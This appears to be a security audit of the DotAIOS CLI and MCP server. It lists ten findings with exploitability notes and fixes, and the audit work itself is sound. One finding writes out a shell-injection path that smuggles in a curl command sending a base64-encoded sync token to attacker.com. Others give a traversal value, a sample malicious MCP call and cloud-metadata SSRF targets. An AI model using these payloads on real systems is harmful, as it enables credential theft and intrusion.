# Security Audit — DotAIOS v1.17.0

**Branch:** audit/overnight-2026-05-28  
**Date:** 2026-05-29  
**Scope:** packages/cli, packages/core, packages/mcp (ESM .mjs, Node ≥ 20)

---

## Findings Table

| ID | Severity | Effort | File:Line | Title |
|----|----------|--------|-----------|-------|
| S-01 | **P1** | S | `packages/cli/src/commands/connect.mjs:408` | Shell injection in Gemini hook script via `aiosPath` |
| S-02 | **P1** | S | `packages/mcp/src/server.mjs:282` | Arbitrary binary execution via MCP `gwsBin` input |
| S-03 | **P1** | M | `packages/core/src/lightpanda.mjs:51` | No integrity check on downloaded Lightpanda binary |
| S-04 | **P1** | S | `packages/cli/src/commands/install.mjs:43-44,50-51` | Path traversal via unvalidated `--subdir` flag |
| S-05 | **P2** | M | `packages/cli/src/ingest/web.mjs:232` | SSRF: no URL blocklist; follows redirects to internal hosts |
| S-06 | **P2** | S | `packages/cli/src/commands/market.mjs:144`, `packages/cli/src/sync/auth.mjs:22` | No timeout on registry and GitHub token validation fetch |
| S-07 | **P2** | S | `packages/mcp/src/server.mjs:313-329` | No length cap on `type`/`summary`/`source` in `log_event` |
| S-08 | **P2** | S | `packages/core/src/sync-config.mjs:48` | GitHub PAT stored in plaintext in `~/.dotaios/sync.json` |
| S-09 | **P3** | S | `packages/core/src/paths.mjs:28-29` | `vault_path` from `aios.json` used without validation (arbitrary write root) |
| S-10 | **P3** | S | `packages/core/src/licenses.mjs:34` | License keys stored in plaintext at `~/.dotaios/licenses.json` |

---

## Detailed Findings

### S-01 — P1 · Shell injection in Gemini hook script via `aiosPath`

**File:** `packages/cli/src/commands/connect.mjs:404-411`  
**Exploitability:** Confirmed exploitable if the user or an agent runs `dotaios connect gemini --path <crafted-path>`.

`writeGeminiHookScript` writes a `bash` script to `~/.gemini/dotaios-context-hook.sh` using a template literal:

```js
const content = `#!/usr/bin/env bash
npx dotaios brief --compact --json --path "${aiosPath}" 2>/dev/null || echo '{}'
`;
```

`aiosPath` is taken directly from user-supplied `--path` (or `DOTAIOS_PATH`) and is not shell-escaped before interpolation. A double-quote character in the path breaks out of the surrounding quotes. For example:

```
--path '/tmp/aios"; curl http://attacker.com/$(cat ~/.dotaios/sync.json|base64) #'
```

produces a script that runs `curl` each time a Gemini CLI session starts — exfiltrating the GitHub sync token. The gate `assertAiosFolder` only requires `aios.json` to exist inside the path, which an attacker-controlled agent can satisfy.

**Fix sketch (S):** Replace the double-quoted interpolation with a properly single-quoted shell argument: `'${aiosPath.replace(/'/g, "'\"'\"'")}'`, or pass the path via an env var (`DOTAIOS_PATH="..." npx dotaios brief --compact --json`), which eliminates the quoting problem entirely.

---

### S-02 — P1 · Arbitrary binary execution via MCP `gwsBin` input

**File:** `packages/mcp/src/server.mjs:282`, `packages/cli/src/lib/gws.mjs:20-31`  
**Exploitability:** Confirmed. The MCP tool schema exposes `gwsBin` as a free-form string argument on `google_status`, `google_gmail_search`, `google_calendar_agenda`, and `google_drive_search`. The server resolves it via `resolveGwsBinary(optionalString(args.gwsBin))`, which only checks `fs.access(path, X_OK)` — i.e., whether the file is executable — then passes it directly to `spawnSync`.

Any agent with MCP access can send:
```json
{"name": "google_status", "arguments": {"gwsBin": "/tmp/evil-binary"}}
```

If `/tmp/evil-binary` is executable, it runs as the user's process with full access to their home directory.

**Fix sketch (S):** Add an allowlist check: if the explicit path is outside well-known bin dirs (`/usr/bin`, `/usr/local/bin`, PATH entries), reject it. Alternatively, remove `gwsBin` from MCP-exposed tool schemas entirely — legitimate users configure it via `DOTAIOS_GWS_BIN` env, not per-request.

---

### S-03 — P1 · No integrity check on downloaded Lightpanda binary

**File:** `packages/core/src/lightpanda.mjs:26-70`  
**Exploitability:** Requires MITM or compromise of `github.com/lightpanda-io/browser` release assets. Not trivially triggerable but a silent supply-chain vector.

`downloadLightpanda` fetches a platform binary from GitHub Releases over HTTPS, writes it to `~/.dotaios/bin/lightpanda`, sets mode `0o755`, and the CLI subsequently executes it via `spawnSync(lp, ["fetch", "--dump", "html", url])` for every URL ingested. There is no SHA-256 or signature verification. A compromised release would give the attacker persistent code execution on every `dotaios ingest <url>`.

```js
const url = `${RELEASE_BASE}/${platformBinary}`;
const response = await fetchImpl(url);
// ... write to disk, chmod 0o755, execute
```

**Fix sketch (M):** Pin a published SHA-256 hash alongside `LIGHTPANDA_VERSION`; verify after download before `chmod`. Consider a `--skip-lightpanda-download` bypass for CI already in place — extend it to skip if DOTAIOS_SKIP_LIGHTPANDA_DOWNLOAD is set (already done) but add hash verification when it does download.

---

### S-04 — P1 · Path traversal via unvalidated `--subdir` flag

**File:** `packages/cli/src/commands/install.mjs:43-44,50-51`  
**Exploitability:** Direct if user or agent passes `--subdir ../../../etc`; also reachable via a malicious `--registry` entry with `"subdir": "../../../etc"` (market.mjs:228 passes `entry.subdir` verbatim).

```js
sourcePath = options.subdir
  ? path.join(cloneResult.path, options.subdir)
  : cloneResult.path;
```

`path.join("/tmp/dotaios-plugin-abc123", "../../../etc")` resolves to `/etc`. Then `copyDirectory` recursively copies everything from `/etc` into the skills directory. `path.basename(sourcePath)` = `"etc"` is used as the skill/plugin name — no traversal in the name, but sensitive file contents land inside the AIOS folder and are subsequently synced to GitHub.

A malicious registry entry at a custom `--registry` URL can trigger this automatically via `marketInstall`.

**Fix sketch (S):** Validate `--subdir` rejects values starting with `..` or containing `/..`; or use `path.resolve` + a `startsWith(cloneDir)` guard after normalization.

---

### S-05 — P2 · SSRF: no URL blocklist; follows redirects to internal hosts

**File:** `packages/cli/src/ingest/web.mjs:232`  
**Exploitability:** Low on a developer's local machine; elevated in a shared/cloud environment.

`fetchWithTimeout` passes the user-supplied URL to Node.js `fetch()` with `redirect: "follow"` and no protocol or IP blocklist. A malicious URL can target:
- `http://169.254.169.254/latest/meta-data/` (AWS/GCP metadata)
- `http://localhost:8080/internal-api`
- Any RFC-1918 address reachable from the host

The response body is written to the vault as markdown; on cloud hosts this can leak credentials. `canonicalizeUrl` only normalises query params and trailing slashes — it does not validate protocol or host.

**Fix sketch (M):** Check `url.hostname` and `url.protocol` before fetching: block `file:`, `data:`, `ftp:` protocols and private/link-local IP ranges. Node.js `fetch` already rejects `file://` but a blocklist of RFC-1918 ranges protects cloud deployments.

---

### S-06 — P2 · No timeout on registry and GitHub token validation fetch

**Files:** `packages/cli/src/commands/market.mjs:144`, `packages/cli/src/sync/auth.mjs:22`  
**Exploitability:** Denial-of-service / hang — not data-loss.

`fetchHttpRegistry` and `validateToken` call `fetch()` with no `AbortController` / signal. A slow or unresponsive server (or a MITM that holds the connection open) will hang the CLI process indefinitely. `ingestUrl` does have `timeoutMs` / `AbortController` correctly, making the inconsistency jarring.

**Fix sketch (S):** Add a shared `fetchWithTimeout` wrapper (same pattern as `ingest/web.mjs:228-241`) to both functions; 15 s is a reasonable ceiling.

---

### S-07 — P2 · No length cap on `type`/`summary`/`source` fields in MCP `log_event`

**File:** `packages/mcp/src/server.mjs:313-329`  
**Exploitability:** A malicious agent with MCP access can fill `events.jsonl` indefinitely.

`MAX_EVENT_DATA_BYTES = 10000` guards the `data` object, but `type`, `summary`, `project`, `domain`, and `source` go through `requireString`/`optionalString` which have no length limits. Each unlimited string is appended to `events.jsonl` without bounds. A rogue MCP client can spam large entries until disk is full.

**Fix sketch (S):** Cap each of `type`, `summary`, `source`, `project`, `domain` to a reasonable limit (e.g., 1 000 characters) inside `logEvent`.

---

### S-08 — P2 · GitHub PAT stored in plaintext in `~/.dotaios/sync.json`

**File:** `packages/core/src/sync-config.mjs:48`  
**Exploitability:** Requires local OS access; mode `0o600` limits exposure to the user's own processes and root.

The GitHub Personal Access Token (with `repo` scope) is written verbatim to `~/.dotaios/sync.json`. Mode `0o600` is correctly set. However, the token is also embedded in the git remote URL stored inside `<aios-path>/.git/config` (mode `0o644` by default from git). Any process running as the same user can read both. The `last_error` field in `sync.json` is redacted by `git.mjs:redactToken()` — that path is adequately protected.

**Note:** This is the expected trade-off for a CLI with no keychain integration. The `0o600` mode satisfies KISS/ICP. Flagging for awareness.

**Fix sketch (S):** Use the OS keychain (`keytar` or `secret-storage` via a native addon) for the token on platforms that support it. Alternatively, document explicitly that the token grants write access to the user's private GitHub repo and instruct users to use fine-grained PATs scoped to only that repository. Mark as [KISS-RISK] if a keychain dependency is added.

---

### S-09 — P3 · `vault_path` from `aios.json` not validated (arbitrary write root)

**File:** `packages/core/src/paths.mjs:28-29`

`resolveVaultPath(config, aiosPath)` returns `config?.vault_path` raw if set. A crafted `aios.json` with `vault_path: "/etc"` would route all ingest writes to `/etc/raw/` (which would fail on permissions but leak path info in errors). No traversal guard or `path.isAbsolute()` restriction is applied.

**Fix sketch (S):** Require `vault_path`, when present, to be an absolute path pointing outside system dirs, or at minimum not start with `/etc`, `/usr`, `/sys`, etc. In practice, users set it to an external Obsidian vault — document valid values and validate in `ensureAiosFolder`.

---

### S-10 — P3 · License keys stored in plaintext at `~/.dotaios/licenses.json`

**File:** `packages/core/src/licenses.mjs:34`

License keys (Gumroad) are written with mode `0o600`, which is appropriate. However they are in plaintext JSON and readable by any process running as the same user. Gumroad license keys can be re-verified by the license holder; theft enables others to verify the same key but not trivially impersonate the purchaser.

**Fix sketch (S):** Document the plaintext storage in the `dotaios license add` confirmation message so users are aware. A keychain-backed store would be an improvement but is [KISS-RISK] as it adds a native dependency.

---

## Exploitability Notes (P0/P1)

**S-01 (shell injection):** Directly exploitable. An agent that can invoke `dotaios connect gemini --path <malicious>` (e.g., via an MCP `log_event` that stores a crafted path, then a follow-on connect call) will inject arbitrary shell commands into every subsequent Gemini CLI session start. The injected commands run as the user with their full environment, including `~/.dotaios/sync.json`.

**S-02 (MCP gwsBin):** Directly exploitable by any MCP client connected to the dotaios-mcp server. The MCP server is local-stdio only, so the attacker must already have code execution or must be a compromised/malicious AI agent connected to the MCP session. Once the MCP session is open, `google_status {"gwsBin": "/tmp/evil"}` runs the binary immediately.

**S-03 (Lightpanda download):** Exploitable only via MITM (network) or GitHub release compromise. HTTPS certificate pinning is not used, but standard TLS validation is performed by Node.js. Severity is elevated because the binary is executed on every URL ingest after installation, making persistence trivial.

**S-04 (subdir traversal):** Exploitable by a malicious public registry (reachable if `DOTAIOS_REGISTRY_URL` is set to attacker-controlled URL, or if `dotaios.com/registry.json` is compromised). With a `--registry` override the user can be social-engineered. The traversal copies files but does not escape the write target's owner permissions.

---

## Items Not Found / Out of Scope Confirmation

- **Command injection in lightpanda spawn:** URL is passed as `args[3]` (argv array, not shell string) — no injection.
- **Prototype pollution via JSON.parse + spread:** `Object.spread` does not propagate `__proto__` to `Object.prototype` in V8 — not exploitable.
- **manifest.name path traversal:** Validated against `/^[a-z0-9][a-z0-9-]*$/` — traversal characters blocked.
- **import.mjs safeSlug traversal:** `replace(/[^a-z0-9]+/g, '-')` strips all path separators — safe.
- **MCP safeRelativePath bypass:** `path.normalize` + `startsWith('..')` check — no known bypass.
- **Token in `last_error`:** All git error messages pass through `redactToken()` before storage.
- **Gemini/OpenCode MCP server args injection:** `aiosPath` is written into `args: ["dotaios-mcp", "--path", aiosPath]` as a JSON array element, not a shell string — safe.
